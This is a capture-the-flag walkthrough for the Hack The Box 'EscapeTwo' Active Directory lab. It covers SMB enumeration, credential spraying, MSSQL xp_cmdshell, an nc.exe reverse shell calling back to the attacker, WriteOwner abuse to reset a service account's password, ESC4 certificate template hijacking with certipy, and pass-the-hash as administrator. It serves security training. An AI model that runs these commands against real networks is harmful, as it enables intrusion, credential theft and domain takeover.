# EscapeTwo: Easy

* we are given the credentials for the following account: 'rose:KxEPkKe6R8su'

```sh
sudo vim /etc/hosts
# add escapetwo.htb

nmap -T4 -p- -A -Pn -v escapetwo.htb
```

* open ports & services:

    * 53/tcp: domain: Simple DNS Plus
    * 88/tcp: kerberos-sec: Microsoft Windows Kerberos
    * 135/tcp: msrpc: Microsoft Windows RPC
    * 139/tcp: netbios-ssn: Microsoft Windows netbios-ssn
    * 389/tcp: ldap: Microsoft Windows Active Directory LDAP
    * 445/tcp: microsoft-ds
    * 464/tcp: kpasswd5
    * 593/tcp: ncacn_http: Microsoft Windows RPC over HTTP 1.0
    * 636/tcp: ssl/ldap: Microsoft Windows Active Directory LDAP
    * 1433/tcp: ms-sql-s: Microsoft SQL Server 2019
    * 3268/tcp: ldap: Microsoft Windows Active Directory LDAP
    * 3269/tcp: ssl/ldap: Microsoft Windows Active Directory LDAP
    * 5985/tcp: http: Microsoft HTTPAPI httpd 2.0
    * 9389/tcp: mc-nmf: .NET Message Framing

* the ```nmap``` scan gives us some additional info:

    * it gives us the domain names: 'sequel.htb0', 'DC01.sequel.htb', 'sequel.htb': update in ```/etc/hosts```
    * Windows version is 10.0.17763
    * MS SQL Server 2019 RTM version is 15.00.2000.00
    * smb2-security-mode: Message signing enabled and required

* enumerating SMB:

    ```sh
    smbmap -H escapetwo.htb
    # access denied

    smbmap -H escapetwo.htb -u rose -p KxEPkKe6R8su
    # this shows a few read-only shares

    enum4linux-ng escapetwo.htb -A -u rose -p KxEPkKe6R8su

    # we can check each of the shares
    
    smbclient -U rose \\\\escapetwo.htb\\Accounting\ Department
    # this works

    dir
    # shows 2 excel files

    get accounting_2024.xlsx
    get accounts.xlsx

    exit

    # check other shares

    smbclient -U rose \\\\escapetwo.htb\\IPC$
    # NT_STATUS_NO_SUCH_FILE error

    smbclient -U rose \\\\escapetwo.htb\\NETLOGON
    # no files

    smbclient -U rose \\\\escapetwo.htb\\SYSVOL
    # this has files

    dir

    cd sequel.htb

    dir
    # 3 folders - 'DfsrPrivate', 'Policies' and 'scripts'

    cd DfsrPrivate
    # NT_STATUS_ACCESS_DENIED

    cd Policies
    # check for any secrets

    dir

    cd {31B2F340-016D-11D2-945F-00C04FB984F9}

    dir

    cd MACHINE

    dir

    get comment.cmtx
    get Registry.pol

    # check other directories, but we do not have a lot of useful files

    exit

    smbclient -U rose \\\\escapetwo.htb\\Users
    
    recurse
    # enable recursive mode

    ls
    # check all files listed recursively - but nothing of use is shown
    ```

    * ```smbmap``` lists a few read-only shares -

        * Accounting Department
        * IPC$
        * NETLOGON
        * SYSVOL
        * Users
    
    * ```enum4linux``` enumerates a few users via RPC:

        * michael
        * ryan
        * oscar
        * sql_svc
        * rose
        * ca_svc
        * Administrator
        * Guest
        * krbtgt
    
    * ```enum4linux``` lists several groups via RPC: we have a lot of non-default groups

    * checking the shares, the 'Accounting Department' share gives 2 files: 'accounting_2024.xlsx' & 'accounts.xlsx'

    * the 'SYSVOL' & 'Users' shares contain a few files but they do not provide any useful info

* from one of the excel sheets, we get the following creds:

    * 'angela@sequel.htb:0fwz7Q4mSpurIt99'
    * 'oscar@sequel.htb:86LxLBMgEWaKUnBG'
    * 'kevin@sequel.htb:Md9Wlq1E5bZnVDVo'
    * 'sa@sequel.htb:MSSQLP@ssw0rd!'

* we can use these creds further to enumerate other services and for bruteforcing attempts:

    ```sh
    vim usernames.txt
    # save all known usernames

    vim passwords.txt
    # save all known passwords
    ```

* firstly, we can check if any of the creds have command execution, remote access, or access to any other service:

    ```sh
    # we can nxc instead of crackmapexec as an alternative

    nxc smb escapetwo.htb -u usernames.txt -p passwords.txt --ignore-pw-decoding --continue-on-success
    # SMB bruteforce

    nxc winrm escapetwo.htb -u usernames.txt -p passwords.txt --ignore-pw-decoding --continue-on-success
    # WinRM bruteforce

    nxc mssql escapetwo.htb -u usernames.txt -p passwords.txt --ignore-pw-decoding --continue-on-success --local-auth
    # MSSQL bruteforce
    # try with '--local-auth' flag as well as without it

    nxc mssql escapetwo.htb -u usernames.txt -p passwords.txt --ignore-pw-decoding --continue-on-success
    ```

* the SMB bruteforce gives valid creds for 'rose:KxEPkKe6R8su' and 'oscar:86LxLBMgEWaKUnBG'

* the MS SQL bruteforce gives valid creds for 'sa:MSSQLP@ssw0rd!' with possible command execution

* we can check the privileges we have as 'sa' user in MSSQL: [we can continue checking with nxc](https://www.hackingarticles.in/mssql-for-pentester-netexec/):

    ```sh
    nxc mssql escapetwo.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
    # check if we have DB command execution
    # this works

    nxc mssql escapetwo.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth -x ipconfig
    # check if we have system-level command execution
    # this also works

    nxc mssql escapetwo.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth -x whoami
    # this shows the command is executed as 'sequel\sql_svc'

    # enable xp_cmdshell for command execution

    nxc mssql escapetwo.htb -u sa -p 'MSSQLP@ssw0rd!' -M enable_cmdshell -o ACTION=enable --local-auth
    # xp_cmdshell enabled

    # check for any linked servers
    nxc mssql escapetwo.htb -u sa -p 'MSSQLP@ssw0rd!' -M enum_links --local-auth
    # no linked servers found
    ```

* we can try to get a reverse shell next using ```nxc``` - by uploading ```nc.exe``` to the target and executing it:

    ```sh
    locate nc.exe
    
    cp /usr/share/windows-resources/binaries/nc.exe .

    nxc mssql escapetwo.htb -u sa -p 'MSSQLP@ssw0rd!' --put-file nc.exe C:\\Users\\Public\\nc.exe --local-auth
    # double slash for escaping chars
    # this uploads the file

    nc -nvlp 5555
    # setup listener

    nxc mssql escapetwo.htb -u sa -p 'MSSQLP@ssw0rd!' -x "C:\\Users\\Public\\nc.exe -e cmd.exe 10.10.14.10 5555" --local-auth
    # execute revshell command for 'nc.exe'
    ```

* this works and we get a reverse shell:

    ```cmd
    whoami
    # 'sequel\sql_svc'

    dir C:\
    # enumerate files
    # there is a non-default folder 'SQL2019'

    dir C:\Users
    # we have users 'Administrator', 'ryan' and 'sql_svc'

    dir C:\Users\ryan
    # no access

    dir C:\Users\sql_svc
    # we have access to this folder
    # checking all files does not give anything

    dir C:\SQL2019
    # check the SQL folder for any secrets
    # this contains a folder

    dir C:\SQL2019\ExpressAdv_ENU
    # contains a few config files

    type C:\SQL2019\ExpressAdv_ENU\MEDIAINFO.XML

    type C:\SQL2019\ExpressAdv_ENU\SETUP.EXE.CONFIG

    type C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI
    ```

* the 'sql_svc' user directory does not contain any useful files

* checking the non-default folder at ```C:\SQL2019```, we have a few config files: one of the files at ```C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI``` gives us an additional password 'WqSZAF6CysDQbGb3'

* we can update the passwords list on attacker, and attempt a bruteforce for all services again: to check for password re-use:

    ```sh
    vim passwords.txt
    # update password file

    nxc smb escapetwo.htb -u usernames.txt -p passwords.txt --ignore-pw-decoding --continue-on-success
    # SMB bruteforce
    ```

* the bruteforce attempt shows the password 'WqSZAF6CysDQbGb3' is valid for users 'ryan' and 'sql_svc'

* we can check if WinRM login is possible for 'ryan':

    ```sh
    evil-winrm -i escapetwo.htb -u ryan -p 'WqSZAF6CysDQbGb3'
    # this works
    ```

* WinRM login works and we have a shell as 'ryan' now:

    ```ps
    whoami
    # 'sequel\ryan'

    type C:\Users\ryan\Desktop\user.txt
    # user flag

    whoami /priv
    # no interesting privileges

    whoami /groups
    # shows 'Management Department' as a non-default group
    ```

* using the command ```whoami /groups``` shows that 'ryan' is a part of a non-default group 'SEQUEL\Management Department'

* we can check more about this group using tools like ```PowerView```:

    ```ps
    net group "Management Department" /domain
    # 'ryan' is the only member

    # upload PowerView script to attacker using evil-winrm upload

    upload /home/sv/PowerView.ps1

    Import-Module .\PowerView.ps1

    Get-NetGroup "Management Department"
    # get group info

    Invoke-ACLScanner -ResolveGUIDs
    # check for interesting ACLs
    ```

* checking for interesting ACEs using ```Invoke-ACLScanner -ResolveGUIDs``` shows that user 'ryan' has 'WriteOwner' rights on the 'Certification Authority' object:

    ```yaml
    ObjectDN                : CN=Certification Authority,CN=Users,DC=sequel,DC=htb
    AceQualifier            : AccessAllowed
    ActiveDirectoryRights   : WriteOwner
    ObjectAceType           : None
    AceFlags                : ContainerInherit
    AceType                 : AccessAllowed
    InheritanceFlags        : ContainerInherit
    SecurityIdentifier      : S-1-5-21-548670397-972687484-3496335370-1114
    IdentityReferenceName   : ryan
    IdentityReferenceDomain : sequel.htb
    IdentityReferenceDN     : CN=Ryan Howard,CN=Users,DC=sequel,DC=htb
    IdentityReferenceClass  : user
    ```

* we can look more into the 'Certification Authority' object first:

    ```ps
    Get-NetUser | select cn
    # prints all usernames
    # this includes 'Certification Authority'

    Get-NetUser
    # check all users
    ```

* checking all user info shows that 'Certification Authority' object refers to 'ca_svc' user

* Googling on privesc vectors for WriteOwner shows [there are multiple ways to abuse it](https://www.hackingarticles.in/abusing-ad-dacl-writeowner/): we can use any of the given methods to abuse WriteOwner permission on another user:

    ```sh
    # on attacker

    # grant ownership using 'owneredit' tool
    owneredit.py -action write -new-owner 'ryan' -target-dn 'CN=Certification Authority,CN=Users,DC=sequel,DC=htb' 'sequel'/'ryan':'WqSZAF6CysDQbGb3' -dc-ip 10.129.175.205
    # owner SID modified

    # next, use dacledit.py to assign FullControl right over the user
    dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target-dn 'CN=Certification Authority,CN=Users,DC=sequel,DC=htb' 'sequel'/'ryan':'WqSZAF6CysDQbGb3' -dc-ip 10.129.175.205
    # DACL modified

    # as we have full control, we need to change password next using 'ForceChangePassword'

    # we can use bloodyAD
    pip install bloodyAD

    bloodyAD --host "10.129.175.205" -d "DC01.sequel.htb" -u "ryan" -p "WqSZAF6CysDQbGb3" set password "ca_svc" "NewPass123!"
    # this gives an error
    ```

* trying to change password using ```bloodyAD``` gives this error: "Password can't be changed before -1 day, 0:03:57.643259 because of the minimum password age policy.": this is either because of a time-bound requirement or a complex password policy

* to avoid any issues, we need to run the password change command as quick as possible, immediately after abusing the 'WriteOwner' permissions:

    ```sh
    bloodyAD --host "10.129.175.205" -d "DC01.sequel.htb" -u "ryan" -p "WqSZAF6CysDQbGb3" set password "ca_svc" "SZAF6CysDQbGb3WqSZAF@"
    # doing it quickly works and the password is changed
    ```

* we can try logging in as 'ca_svc' now:

    ```sh
    evil-winrm -i escapetwo.htb -u ca_svc -p 'SZAF6CysDQbGb3WqSZAF@'
    # this does not work
    ```

* we do not have direct command execution using 'ca_svc' user: we need to find what are other ways we can abuse this user:

    ```ps
    # on target

    Get-NetUser ca_svc
    ```

* checking the user details shows that 'ca_svc' is a member of 'Cert Publishers'

* Google shows that 'Cert Publishers' group is a built-in AD group, which is used to authorize Certificate Authorities to publish certificates directly to AD objects

* searching for privilege escalation vectors leads to [multiple abuse techniques associated with Certificate Services (AD-CS)](https://www.thehacker.recipes/ad/movement/adcs/)

* we can use the [certipy tool to check for vulnerabilities to abuse AD CS](https://www.hackingarticles.in/a-detailed-guide-on-certipy/):

    ```sh
    # on attacker

    # we can use the certipy-ad tool

    certipy-ad find -u ca_svc -p "SZAF6CysDQbGb3WqSZAF@" -dc-ip 10.129.175.205 -target-ip 10.129.175.205 -vulnerable -enable -stdout
    # this works
    
    # in case the authentication fails, we need to do the abuse steps for WriteOwner rights again to set the password again
    ```

* the ```certipy-ad``` output lists 'ESC4' as a vulnerability, and lists one certificate template: 'DunderMifflinAuthentication'

* we can check [what each of the privesc vectors for certipy refer to](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation): ESC4 is listed as 'Template Hijacking'

* we can follow the [ESC4 privesc vector steps](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc4-template-hijacking):

    ```sh
    certipy-ad template -u ca_svc -p "SZAF6CysDQbGb3WqSZAF@" -dc-ip 10.129.175.205 -target-ip 10.129.175.205 -template 'DunderMifflinAuthentication' -write-default-configuration
    # confirm the changes
    # this modifies the template to a vulnerable state

    # next, request a certificate with modified template

    certipy-ad req -u ca_svc -p "SZAF6CysDQbGb3WqSZAF@" -dc-ip 10.129.175.205 -target-ip 10.129.175.205 -ca 'sequel-DC01-CA' -template 'DunderMifflinAuthentication' -upn 'administrator@sequel.htb'
    # CA name taken from 'certipy find' output
    # this gives us a certificate for 'administrator' user

    # now we can authenticate using fetched certificate
    certipy-ad auth -pfx 'administrator.pfx' -dc-ip 10.129.175.205
    # this gives us NTLM hash for 'administrator'
    ```

* as we have hashes for 'administrator', we can use it for command execution:

    ```sh
    psexec.py sequel/administrator@sequel.htb -hashes aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
    # this works and we get a shell

    whoami
    # 'nt authority\system'

    type C:\Users\Administrator\Desktop\root.txt
    # root flag
    ```
